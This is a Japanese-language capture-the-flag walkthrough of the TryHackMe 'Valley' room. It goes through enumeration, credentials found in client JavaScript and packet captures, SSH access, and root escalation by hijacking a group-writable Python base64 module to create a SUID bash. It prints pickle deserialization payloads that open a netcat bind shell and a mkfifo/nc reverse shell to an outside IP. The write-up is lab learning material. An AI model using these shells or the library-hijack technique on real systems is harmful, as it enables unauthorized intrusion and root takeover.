# Valley CTF

https://tryhackme.com/room/valleype

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.181.38

root@ip-10-10-217-113:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-14 23:44 GMT
Nmap scan report for 10.10.181.38
Host is up (0.00013s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown
MAC Address: 02:11:25:88:16:ED (Unknown)

root@ip-10-10-217-113:~# sudo nmap -sV -p22,80,37370 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-14 23:45 GMT
Nmap scan report for 10.10.181.38
Host is up (0.00017s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     vsftpd 3.0.3
MAC Address: 02:11:25:88:16:ED (Unknown)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-217-113:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.38
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 301) [Size: 314] [--> http://10.10.181.38/gallery/]
/static               (Status: 301) [Size: 313] [--> http://10.10.181.38/static/]
/pricing              (Status: 301) [Size: 314] [--> http://10.10.181.38/pricing/]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-217-113:~# gobuster dir -x=txt,php -u http://$TARGET/gallery -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.38/gallery
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-217-113:~# gobuster dir -x=txt,php -u http://$TARGET/pricing -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.38/pricing
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/note.txt             (Status: 200) [Size: 57]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/note.txt
```text
J,
Please stop leaving notes randomly on the website
-RP
```

ランダムにノートが残されているらしい。

ランダムファイル名を作ったが、note.txt しかヒットしない。

```shell
seq 100000 > num.txt
```

```shell
echo {a..z}  | tr ' ' '\n' > random.txt
echo {a..z}{a..z}  | tr ' ' '\n' >> random.txt
echo {a..z}{a..z}{a..z}  | tr ' ' '\n' >> random.txt
echo {a..z}{a..z}{a..z}{a..z}  | tr ' ' '\n' >> random.txt
```

```shell
perl -le 'for $i ("0".."9", "a".."z") { for $j ("0".."9", "a".."z") { for $k ("0".."9", "a".."z") { for $l ("0".."9", "a".."z") { print "$i$j$k$l" } } } }' > list.txt
```

dirsearch を /static に対してかけたら、/static/00 ファイルを見つけた。

```shell
$ dirsearch -u http://$TARGET/static/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_10.10.181.38/_static__25-02-14_20-31-43.txt

Target: http://10.10.181.38/

[20:31:43] Starting: static/                                                                                        
[20:31:59] 403 -  277B  - /static/.ht_wsr.txt                               
[20:31:59] 403 -  277B  - /static/.htaccess.bak1                            
[20:31:59] 403 -  277B  - /static/.htaccess_orig                            
[20:31:59] 403 -  277B  - /static/.htaccess.sample
[20:31:59] 403 -  277B  - /static/.htaccess_sc
[20:31:59] 403 -  277B  - /static/.htaccess_extra                           
[20:31:59] 403 -  277B  - /static/.htaccess.save
[20:31:59] 403 -  277B  - /static/.htaccess.orig
[20:31:59] 403 -  277B  - /static/.htaccessOLD2
[20:31:59] 403 -  277B  - /static/.htaccessOLD                              
[20:31:59] 403 -  277B  - /static/.htm                                      
[20:31:59] 403 -  277B  - /static/.html
[20:31:59] 403 -  277B  - /static/.htaccessBAK
[20:31:59] 403 -  277B  - /static/.htpasswd_test                            
[20:31:59] 403 -  277B  - /static/.httr-oauth
[20:31:59] 403 -  277B  - /static/.htpasswds
[20:32:13] 200 -  127B  - /static/00                                        
[20:32:21] 200 -    2MB - /static/16                                        
[20:32:21] 200 -    4MB - /static/14                                        
[20:32:22] 200 -    3MB - /static/15                                        
[20:32:24] 200 -    4MB - /static/13                                        
[20:32:27] 200 -  613KB - /static/11                                        
[20:32:29] 200 -    1MB - /static/5                                         
[20:32:29] 200 -    2MB - /static/10                                        
[20:32:30] 200 -    3MB - /static/2                                         
[20:32:32] 200 -    2MB - /static/18                                        
[20:32:33] 200 -    7MB - /static/4                                         
[20:32:33] 200 -    2MB - /static/1
[20:32:33] 200 -    3MB - /static/17                                        
[20:32:33] 200 -    8MB - /static/8                                         
[20:32:35] 200 -  412KB - /static/3                                         
[20:32:38] 200 -    2MB - /static/12                                        
[20:32:39] 200 -    5MB - /static/7                                         
[20:32:40] 200 -    2MB - /static/6                                         
[20:32:40] 200 -    1MB - /static/9
```


/static/00

```text
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

## /dev1243224123123
ログイン画面が表示された

dev.js
```js
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

siemDev / california で、/dev1243224123123/devNotes37370.txt に移動する実装。

/dev1243224123123/devNotes37370.txt
```text
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

FTPで同じ認証を使っていることを示唆している。  
vsftpd 3.0.3 に存在する脆弱性は、DoS。

## FTP

```shell
$ ftp 10.10.181.38 -P 37370
Connected to 10.10.181.38.
220 (vsFTPd 3.0.3)
Name (10.10.181.38:kali): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```shell
ftp> ls -a
229 Entering Extended Passive Mode (|||7953|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
```

3つのパケットキャプチャファイル。それぞれwiresharkで開ける。

### siemFTP.pcapng

- ローカルで21ポートのFTPに、anonymous/anonymous でログインしている。

### siemHTTP1.pcapng

- 192.168.111.136 から 34.218.221.118 にリクエスト
- GET /testcat_mo.html HTTP/1.1\r\n 
- GET /testcat_pr.html HTTP/1.1\r\n
- GET /testcat_pu.html HTTP/1.1\r\n
- GET /testcat_pa.html HTTP/1.1\r\n

### siemHTTP2.pcapng

- index.html への POST データが見つかった。

```text
Form item: "uname" = "valleyDev"
Form item: "psw" = "ph0t0s1234"
```

これを使ってSSHログインできた。

## SSH

```shell
valleyDev@valley:~$ cat ./user.txt
THM{k........}
```

## 権限昇格

### SUID
```shell
valleyDev@valley:~$ find / -perm -u=s -type f -ls 2>/dev/null
   264870    144 -rwsr-xr-x   1 root     root       146888 Dec  1  2022 /usr/lib/snapd/snap-confine
   264718    464 -rwsr-xr-x   1 root     root       473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
   262702     16 -rwsr-sr-x   1 root     root        14488 Feb  7  2023 /usr/lib/xorg/Xorg.wrap
   263593     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264634     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   272013     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   272950     12 -rwsr-xr-x   1 root     root          10224 Jan 22  2017 /usr/lib/authbind/helper
   272011     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
   264356     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp
   262925     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount
   262628    164 -rwsr-xr-x   1 root     root         166056 Jan 16  2023 /usr/bin/sudo
   262504     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
   263400     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount
   271192     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd
   271171     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh
   263304     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su
   271174     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd
   270755     16 -rwsr-xr-x   1 root     root          14728 Sep 19  2022 /usr/bin/vmware-user-suid-wrapper
   271167     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn
   270829    388 -rwsr-xr--   1 root     dip          395144 Jul 23  2020 /usr/sbin/pppd
      139    121 -rwsr-xr-x   1 root     root         123560 Feb 22  2023 /snap/snapd/18596/usr/lib/snapd/snap-confine
      139    121 -rwsr-xr-x   1 root     root         123560 Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine
      815     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /snap/core20/1828/usr/bin/chfn
      821     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /snap/core20/1828/usr/bin/chsh
      890     87 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
      974     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1828/usr/bin/mount
      983     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /snap/core20/1828/usr/bin/newgrp
      998     67 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /snap/core20/1828/usr/bin/passwd
     1108     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1828/usr/bin/su
     1109    163 -rwsr-xr-x   1 root     root         166056 Jan 16  2023 /snap/core20/1828/usr/bin/sudo
     1167     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1828/usr/bin/umount
     1256     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1628    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
      811     84 -rwsr-xr-x   1 root     root               85064 Mar 14  2022 /snap/core20/1611/usr/bin/chfn
      817     52 -rwsr-xr-x   1 root     root               53040 Mar 14  2022 /snap/core20/1611/usr/bin/chsh
      886     87 -rwsr-xr-x   1 root     root               88464 Mar 14  2022 /snap/core20/1611/usr/bin/gpasswd
      970     55 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /snap/core20/1611/usr/bin/mount
      979     44 -rwsr-xr-x   1 root     root               44784 Mar 14  2022 /snap/core20/1611/usr/bin/newgrp
      992     67 -rwsr-xr-x   1 root     root               68208 Mar 14  2022 /snap/core20/1611/usr/bin/passwd
     1101     67 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /snap/core20/1611/usr/bin/su
     1102    163 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /snap/core20/1611/usr/bin/sudo
     1160     39 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /snap/core20/1611/usr/bin/umount
     1249     51 -rwsr-xr--   1 root     systemd-resolve    51344 Apr 29  2022 /snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1621    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1611/usr/lib/openssh/ssh-keysign
```

### cron
```shell
valleyDev@valley:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

/photos/script/photosEncrypt.py が毎分実行されている。

#### /photos/script/photosEncrypt.py

```shell
valleyDev@valley:~$ ls -al /photos/script
total 12
drwxr-xr-x 2 root root 4096 Mar  6  2023 .
drwxr-xr-x 4 root root 4096 Mar  6  2023 ..
-rwxr-xr-x 1 root root  621 Mar  6  2023 photosEncrypt.py
```
更新は不可。

```python
valleyDev@valley:~$ cat /photos/script/photosEncrypt.py
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

- /photos ディレクトリの 1.jpg ～　6.jpg を開く
- Base64エンコードし、/photos/photoVault ディレクトリに、1.enc ～ 6.enc をバックアップ

```shell
valleyDev@valley:~$ ls -al /photos
total 20872
drwxr-xr-x  4 root   root      4096 Mar  6  2023 .
drwxr-xr-x 21 root   root      4096 Mar  6  2023 ..
-rw-rw-r--  1 valley valley 1989312 Mar  6  2023 p1.jpg
-rw-rw-r--  1 valley valley 7939986 Mar  6  2023 p2.jpg
-rw-rw-r--  1 valley valley 2944190 Mar  6  2023 p3.jpg
-rw-rw-r--  1 valley valley 2302840 Mar  6  2023 p4.jpg
-rw-rw-r--  1 valley valley 1749699 Mar  6  2023 p5.jpg
-rw-rw-r--  1 valley valley 4418823 Mar  6  2023 p6.jpg
drwxr-xr-x  2 root   root      4096 Mar  6  2023 photoVault
drwxr-xr-x  2 root   root      4096 Mar  6  2023 script

valleyDev@valley:~$ ls -al /photos/photoVault/
total 27812
drwxr-xr-x 2 root root     4096 Mar  6  2023 .
drwxr-xr-x 4 root root     4096 Mar  6  2023 ..
-rw-r--r-- 1 root root  2652416 Feb 14 18:41 p1.enc
-rw-r--r-- 1 root root 10586648 Feb 14 18:41 p2.enc
-rw-r--r-- 1 root root  3925588 Feb 14 18:41 p3.enc
-rw-r--r-- 1 root root  3070456 Feb 14 18:41 p4.enc
-rw-r--r-- 1 root root  2332932 Feb 14 18:41 p5.enc
-rw-r--r-- 1 root root  5891764 Feb 14 18:41 p6.enc
```

valleyユーザーになれば jpg ファイルの内容を変更できるが・・・

https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html?highlight=base64.b64encode#exploit  
によれば、pickle.dumps したクラスを base64.b64encode のパラメータにすると、reduceメソッドが実行される。

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```

valleyユーザーになり、p1.jpg に pickle.dump で保存することを目指す。

### Valley昇格

```shell
valleyDev@valley:~$ ls -al /home
total 752
drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
valleyDev@valley:~$ file /home/valleyAuthenticator 
/home/valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```

#### ghidra
ghidraで valleyAuthenticator を解析しようとしたが成果出ず。

#### strings

strings を実行したら「e6722920bab2326f8217e4」というMD5ハッシュっぽい文字列があった。対応するパスワードは「liberty123」。

valleyユーザーにsuできた。
```shell
valleyDev@valley:/home$ su valley
Password: 
valley@valley:/home$ 
```

## root昇格

Base64エンコードで reduce 関数を実行させる手口を試す。

test.py
```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 6666 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f",))

with open("/photos/p1.jpg", "wb") as f:
    pickle.dump(P(), f)
```

```shell
$ nc -nlvp 6666                         
listening on [any] 6666 ...
```

反応なし。  
cat等の単純なコマンドに置き換えても、機能する気配がない。

### valleyAdmin グループ

```shell
valley@valley:~$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

valleyAdminという謎のグループに入っている。   
このグループが所有するファイル。

```shell
valley@valley:~$ find / -group valleyAdmin -type f 2>/dev/null
/usr/lib/python3.8/base64.py
```

/usr/lib/python3.8/base64.py に SUID付きで bash をコピーする処理を追加。
```python
import os
os.system("cp /usr/bin/bash /tmp/bash; chmod u+s /tmp/bash");
```

コピーされた。

```shell
valley@valley:~$ ls -al /tmp
total 1212
drwxrwxrwt 14 root   root      4096 Feb 14 22:05 .
drwxr-xr-x 21 root   root      4096 Mar  6  2023 ..
-rwsr-xr-x  1 root   root   1183448 Feb 14 22:05 bash
```

```shell
valley@valley:~$ /tmp/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{v.......}
```

ルートフラグゲット！

## 振り返り

- 00 ファイルを見つけるのが難しかった。連番の10までの数値はブルートフォースできていたが、0埋めするパターンが欠けていた。
- pickleダンプとBase64エンコードを悪用する手口が機能しなかった理由は不明。

